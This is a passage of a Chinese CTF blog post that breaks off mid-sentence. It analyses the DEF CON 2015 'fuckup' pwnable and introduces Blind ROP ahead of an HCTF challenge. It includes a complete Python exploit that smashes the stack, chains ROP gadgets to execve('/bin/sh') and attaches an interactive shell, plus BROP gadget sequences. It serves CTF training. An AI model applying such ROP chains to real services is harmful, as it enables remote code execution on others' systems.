&#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">重头戏来了：Defcon 2015 Qualifier fuckup</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">题目可以在这里下载： </span><a href="https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/pwnable/fuckup" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">this</a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们照旧来分析程序：</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">总体上来说</span></strong><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">程序应该是开启了ASLR 的，每次&nbsp;&nbsp;&nbsp;&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">用户执行命令时，FUCKUP会根据类似于WELL512的生成算法生成的随机数，改变二进制映射的存储器的基址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当我们运行程序时，可以看到有一个菜单</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;./fuckup
+Welcome&nbsp;to&nbsp;Fully&nbsp;Unguessable&nbsp;Convoluted&nbsp;Kinetogenic&nbsp;Userspace&nbsp;Pseudoransomization,&nbsp;the&nbsp;new&nbsp;and&nbsp;improved&nbsp;ASLR.
+This&nbsp;app&nbsp;is&nbsp;to&nbsp;help&nbsp;prove&nbsp;the&nbsp;benefits&nbsp;of&nbsp;F.U.C.K.U.P.
+Main&nbsp;Menu
+---------
+1.&nbsp;Display&nbsp;info
+2.&nbsp;Change&nbsp;random
+3.&nbsp;View&nbsp;state&nbsp;info
+4.&nbsp;Test&nbsp;stack&nbsp;smash
+-------
+0.&nbsp;Quit</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">当运行函数，以及反编译程序之后，我们可以了解程序功能。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当我们选择功能2的时候，“App moved to new random location”，text段和stack会被修改，重新指向新的内存地址</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当我们选择3的时候，会告诉我们最后一个随机数(其当前determienstextbase)再次随机化text。这可以用于PRNG的预测</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">选项4：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">Input&nbsp;buffer&nbsp;is&nbsp;10&nbsp;bytes&nbsp;in&nbsp;size.&nbsp;Accepting&nbsp;100&nbsp;bytes&nbsp;of&nbsp;data.
+This&nbsp;will&nbsp;crash&nbsp;however&nbsp;the&nbsp;location&nbsp;of&nbsp;the&nbsp;stack&nbsp;and&nbsp;binary&nbsp;are&nbsp;unknown&nbsp;to&nbsp;stop&nbsp;code&nbsp;execution</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">我们在功能3找到一个mmap 地址映射函数：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">change_random(sub_80481A6)
+do
+&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;seedf&nbsp;=&nbsp;randf_state_(a1)&nbsp;*&nbsp;4294967295.0;
+&nbsp;&nbsp;&nbsp;&nbsp;seedl&nbsp;=&nbsp;(signed&nbsp;__int64)seedf;
+&nbsp;&nbsp;&nbsp;&nbsp;expect&nbsp;=&nbsp;(void&nbsp;*)(seedl&nbsp;&amp;&nbsp;0xFFFFF000);
+&nbsp;&nbsp;&nbsp;&nbsp;actual&nbsp;=&nbsp;mmap(v3,&nbsp;0x804CA6C,&nbsp;v2,&nbsp;a1,&nbsp;a2,&nbsp;0);
+&nbsp;&nbsp;}
+&nbsp;&nbsp;while&nbsp;(&nbsp;(seedl&nbsp;&amp;&nbsp;0xFFFFF000)&nbsp;!=&nbsp;actual&nbsp;);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">所以寻常的思路，我们基本是做不了了</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">大概是这样的，做了不一样的地址映射，所以其实这个题目还是要回归于VDSO以及SROP。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">思路如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">32位下vdso 只有1字节是随机的，我们这里可以brute force然后利用其gadget</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以直接利用overflow return address，只有100个字节</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">先利用vdso的gadget做出read sys call 并加大input的大小</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">read 读入的内容放到tls</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">tls位置在vdso前一个page</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">使用sysenter 将stack 换到tls段</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然后，我们在第二次输入的时候 可以将 /bin/sh 放入到tls段，这里要注意但是，这个时候tls已经在栈了</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">紧接着，我们sigreturn gadget 以及 fack signal frame一并放进，然后可以直接execve执行 /bin/sh</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">进行循环，知道成功getshell</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后的exp，我没能搞定，这里可以参考 hastebin.com的脚本</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">#!/usr/bin/env&nbsp;python3
+def&nbsp;read_until(socket,&nbsp;x):
+&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;b&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;True:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;+=&nbsp;socket.recv(4096)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;x&nbsp;in&nbsp;data:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;data:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;RuntimeError(&quot;no&nbsp;data&nbsp;after:&nbsp;%s&quot;&nbsp;%&nbsp;data)
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;data
+def&nbsp;skip(socket,&nbsp;x):
+&nbsp;&nbsp;&nbsp;&nbsp;print(read_until(target,&nbsp;x).decode(&quot;utf8&quot;))
+&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;=======&quot;)
+if&nbsp;__name__&nbsp;==&nbsp;&#39;__main__&#39;:
+&nbsp;&nbsp;&nbsp;&nbsp;import&nbsp;os
+&nbsp;&nbsp;&nbsp;&nbsp;import&nbsp;sys
+&nbsp;&nbsp;&nbsp;&nbsp;import&nbsp;time
+&nbsp;&nbsp;&nbsp;&nbsp;import&nbsp;struct
+&nbsp;&nbsp;&nbsp;&nbsp;import&nbsp;socket
+&nbsp;&nbsp;&nbsp;&nbsp;import&nbsp;argparse
+&nbsp;&nbsp;&nbsp;&nbsp;parser&nbsp;=&nbsp;argparse.ArgumentParser()
+&nbsp;&nbsp;&nbsp;&nbsp;parser.add_argument(&quot;host&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;parser.add_argument(&quot;port&quot;,&nbsp;type=int)
+&nbsp;&nbsp;&nbsp;&nbsp;args&nbsp;=&nbsp;parser.parse_args()
+&nbsp;&nbsp;&nbsp;&nbsp;target&nbsp;=&nbsp;socket.socket()
+&nbsp;&nbsp;&nbsp;&nbsp;target.connect((args.host,&nbsp;args.port))
+&nbsp;&nbsp;&nbsp;&nbsp;input(&quot;Are&nbsp;you&nbsp;ready?&nbsp;This&nbsp;is&nbsp;the&nbsp;time&nbsp;to&nbsp;attach&nbsp;gdb&nbsp;and&nbsp;stuff.&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;skip(target,&nbsp;b&quot;Quit&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;target.send(b&quot;4\n&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;skip(target,&nbsp;b&quot;execution&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;We&nbsp;partially&nbsp;overwrite&nbsp;the&nbsp;return&nbsp;address,&nbsp;we&nbsp;need&nbsp;to&nbsp;comeup
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;with&nbsp;valid-in-the-future&nbsp;values&nbsp;for&nbsp;ebx&nbsp;and&nbsp;ebp.
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;b&quot;a&quot;&nbsp;*&nbsp;14
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x3e1b7a6c)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ebx&nbsp;/&nbsp;computed
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x3e1b8000)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ebp&nbsp;#&nbsp;must&nbsp;only&nbsp;be&nbsp;valid&nbsp;r/w
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;b&quot;\x14&quot;&nbsp;#&nbsp;re-trigger&nbsp;init&nbsp;with&nbsp;known/constant&nbsp;random_seed,&nbsp;provided&nbsp;by&nbsp;esi.
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Make&nbsp;sure&nbsp;we&nbsp;don&#39;t&nbsp;send&nbsp;too&nbsp;much&nbsp;at&nbsp;once.
+&nbsp;&nbsp;&nbsp;&nbsp;target.send(payload)
+&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(1)
+&nbsp;&nbsp;&nbsp;&nbsp;todo&nbsp;=&nbsp;100&nbsp;-&nbsp;len(payload)
+&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;todo&nbsp;&gt;&nbsp;0:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sending&nbsp;=&nbsp;min(10,&nbsp;todo)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target.send(b&quot;a&quot;&nbsp;*&nbsp;(sending&nbsp;-&nbsp;1)&nbsp;+&nbsp;b&quot;\n&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(0.2)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;todo&nbsp;=&nbsp;todo&nbsp;-&nbsp;sending
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;.&quot;,&nbsp;end=&quot;&quot;,&nbsp;flush=True)
+&nbsp;&nbsp;&nbsp;&nbsp;print()
+&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Sent&nbsp;first&nbsp;stage,&nbsp;waiting&nbsp;for&nbsp;menu.&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;skip(target,&nbsp;b&quot;Quit&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;target.send(b&quot;4\n&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;skip(target,&nbsp;b&quot;execution&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Sending&nbsp;exploit.&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;get_addr(addr,&nbsp;name):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;Get&nbsp;runtime&nbsp;addr&nbsp;from&nbsp;ida&nbsp;addr.&quot;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ida_base&nbsp;=&nbsp;0x8048000
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;It&nbsp;seems&nbsp;under&nbsp;xinetd&nbsp;there&nbsp;is&nbsp;one&nbsp;more&nbsp;call&nbsp;to&nbsp;prng().
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Not&nbsp;sure&nbsp;why&nbsp;this&nbsp;is&nbsp;but&nbsp;we&nbsp;just&nbsp;have&nbsp;to&nbsp;check&nbsp;what
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;value&nbsp;will&nbsp;be&nbsp;generated&nbsp;and&nbsp;use&nbsp;that.
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;run_base&nbsp;=&nbsp;0x39d54000&nbsp;#&nbsp;local&nbsp;no&nbsp;xinetd
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;run_base&nbsp;=&nbsp;0xfe97c000&nbsp;#&nbsp;local&nbsp;with&nbsp;xinetd
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;=&nbsp;addr&nbsp;+&nbsp;(run_base&nbsp;-&nbsp;ida_base)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;%s&nbsp;will&nbsp;be&nbsp;at&nbsp;%#.8x&quot;&nbsp;%&nbsp;(name,&nbsp;ret))
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;ret
+&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;pack_addr(addr,&nbsp;name):
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;get_addr(addr,&nbsp;name))
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;b&quot;a&quot;&nbsp;*&nbsp;14
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x42424242)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;base
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x42424242)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ebp
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;This&nbsp;is&nbsp;so&nbsp;we&nbsp;can&nbsp;ironically&nbsp;expect&nbsp;a&nbsp;F.U.C.K.U.P.
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;pack_addr(0x080483C0,&nbsp;&quot;welcome&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Setup&nbsp;syscall.&nbsp;ebx,&nbsp;ecx,&nbsp;edx.&nbsp;eax=11
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;pack_addr(0x0804908f,&nbsp;&quot;pop&nbsp;eax;&nbsp;pop&nbsp;ebx;&nbsp;pop&nbsp;esi;&nbsp;ret&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;11)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;execv
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x22222222)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x22222222)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;pack_addr(0x0804961a,&nbsp;&quot;pop&nbsp;edx;&nbsp;pop&nbsp;ecx;&nbsp;pop&nbsp;ebx;&nbsp;ret&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;pack_addr(0x080485f9,&nbsp;&quot;NULL&quot;)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;environ
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;pack_addr(0x080485f9,&nbsp;&quot;NULL&quot;)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;argv
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x22222222)
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Now&nbsp;we&nbsp;use&nbsp;this&nbsp;neat&nbsp;gadget,&nbsp;/bin/sh&nbsp;is&nbsp;right&nbsp;after&nbsp;us.
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;pack_addr(0x0804875b,&nbsp;&quot;lea&nbsp;ebx,&nbsp;[esp+4];&nbsp;int&nbsp;0x80&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;pack_addr(0x08048a11,&nbsp;&quot;pop;&nbsp;pop;&nbsp;ret&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;b&quot;/bin/sh\x00&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;0x44444444)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;eip,&nbsp;too&nbsp;lazy&nbsp;for&nbsp;clean&nbsp;exit.
+&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;payload.ljust(100,&nbsp;b&quot;\xcc&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Ok,&nbsp;sanity&nbsp;check&nbsp;and&nbsp;good&nbsp;to&nbsp;go.
+&nbsp;&nbsp;&nbsp;&nbsp;assert&nbsp;len(payload)&nbsp;&lt;=&nbsp;100,&nbsp;&quot;payload&nbsp;too&nbsp;large,&nbsp;%d&nbsp;bytes.&quot;&nbsp;%&nbsp;len(payload)
+&nbsp;&nbsp;&nbsp;&nbsp;target.send(payload)
+&nbsp;&nbsp;&nbsp;&nbsp;skip(target,&nbsp;b&quot;F.U.C.K.U.P.&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;target.set_inheritable(True)
+&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;You&nbsp;should&nbsp;be&nbsp;able&nbsp;to&nbsp;type&nbsp;stuff&nbsp;now.&quot;)
+&nbsp;&nbsp;&nbsp;&nbsp;os.system(&quot;socat&nbsp;STDIO&nbsp;FD:%d&quot;&nbsp;%&nbsp;target.fileno())</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 32px;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 32px;">BROP</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">前两天在360安全客看到了一篇文章，《格式化字符串blind pwn详细教程》，看了下内容，大概就是教我们如何利用格式化串漏洞dump 程序，但是在二进制漏洞中，以及CTF Pwn题型中，还有一种考点？说利用方式吧，叫Bind ROP。对于这些相关的东西，我们其实可以在浏览器搜索到，比如K0师傅</span><a href="http://bobao.360.cn/learning/detail/3415.html" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">《BROP Attack之Nginx远程代码执行漏洞分析及利用》</a><span style="text-indent: 2em; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">，以及mctrain前辈在wooyun社区发布的《Blind Return Oriented Programming (BROP) Attack - 攻击原理》。其实都能很详细看到了解BROP的攻击原理，以及攻击样例。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当然这个也是《 基础栈溢出及其利用方式的》系列的一部分。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">什么是BROP</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">那么我也只是在这里尽量让大家先明白，什么是BORP，以及BROP的攻击原理，以及在后面放一个最近CTF中，及HCTF --出题人跑路了的PWN题的详细分析。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">BROP 原文：</span><a href="http://www.scs.stanford.edu/brop/" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Blind Return Oriented Programming (BROP) Website</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">其核心要义就是，通过ROP的方法，远程攻击一个应用程序，劫持程序控制流程。其难点在于，我们并没有程序的源代码以及二进制程序。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">详细的东西，我也不想再继续搬了，mctrain在文章讲得已经非常不错了，我在这里提供我的drop地址，不过大家少用阿，这玩意儿吃流量 </span><a href="http://wooyun.bestwing.top:5000/static/drops/tips-3071.html" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Blind Return Oriented Programming (BROP) Attack - 攻击原理</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">大概总结下</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">看了 Drops的文章，我们大概可总结一下攻击流程</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果有Canary 防护，需要通过brute-force暴力破解或者 作者提出的方法“stack reading”</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">寻找stop gadget或者叫 hang gadget，这gadgaet使得程序进入了无限循环，并且hang，使得攻击者保持连接状态。（如blocking的系统调用 sleep)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">寻找可以利用的，即potentially useful gadgets。这里指useful指的是具有某些功能，并不会造成crash的gadget</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">远程dump内存，（当然如果有格式化串，可以利用那也简便狠多，可以参考安全客文章《格式化字符串blind pwn详细教程》），如果没有，我们可能需要一个write的系统调用，传入一个socket文件描述符。</span></p><pre class="brush:plain;toolbar:false">write(int&nbsp;sock,void&nbsp;*buf,int&nbsp;len)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">转化成4条汇编指令就是</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">pop&nbsp;%rdi&nbsp;ret
+pop&nbsp;%rsi&nbsp;ret
+pop&nbsp;%rdx&nbsp;ret
+call&nbsp;write&nbsp;ret</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">依次对应的是 %rdi-&gt;sock %rsi-&gt;buf %rdx-&gt;len</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在栈上构造好这个四个gadget的内存地址，依次执行顺序调用就可以了（这当然是在我们解决掉Canary之后）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在dump 内存的过程中，pop %rdx ret这样的gadget也许不容易找到，所以作者又提出另一种方法，利用 strcmp函数，达到相同效果</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">所以之后的任务是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">寻找BROP Gadget（注:什么是BROP Gadget 可在Drops仔细阅读）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">找到对用PLT项</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">HCTF 之 出题人失踪了 (brop)</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">了解了，攻击流程，以及攻击方法，我们就可以尝试做这个题目了。杭电的师傅已经，把源码公开在github上了。我们可以自己拿下来编译一下。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">已知信息</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">比赛的时候，题目给了ip和端口 其他任何信息都没有。但是后面给出了bof的buffer大小作为提示。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;checksec
+CANARY&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled
+FORTIFY&nbsp;&nbsp;&nbsp;:&nbsp;disabled
+NX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ENABLED
+PIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled
+RELRO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Partial</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">而且题目没有开Canary防护，所以我们并不需要突破Canary</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">经过测试，当输入的字符超过72字节，程序就不会再打印 No password, No game了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先寻找 stop gadget</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这个地方，muhe师傅交了我一种方法，那就是利用pwntools的异常处理来检测。因为我们需要return 